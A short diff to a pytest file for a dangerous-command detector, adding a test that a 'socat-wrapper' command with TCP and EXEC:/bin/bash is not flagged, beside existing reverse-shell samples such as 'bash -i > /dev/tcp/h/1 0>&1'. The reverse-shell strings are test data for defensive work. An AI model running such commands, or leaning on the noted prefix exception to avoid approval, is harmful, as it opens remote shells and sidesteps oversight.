@@ -51,6 +51,10 @@ def test_reverse_shell_prose_and_plain_netcat_not_flagged(command):
     assert detect_dangerous_command(command)[0] is False
 
 
+def test_socat_prefix_executable_does_not_need_reverse_shell_approval():
+    assert detect_dangerous_command("socat-wrapper TCP:host:4444 EXEC:/bin/bash")[0] is False
+
+
 # A quoted redirect target opens the same socket; only `>&` was caught before, via the `&` separator split.
 @pytest.mark.parametrize("command", [
     'bash -i > "/dev/tcp/h/1" 0>&1',
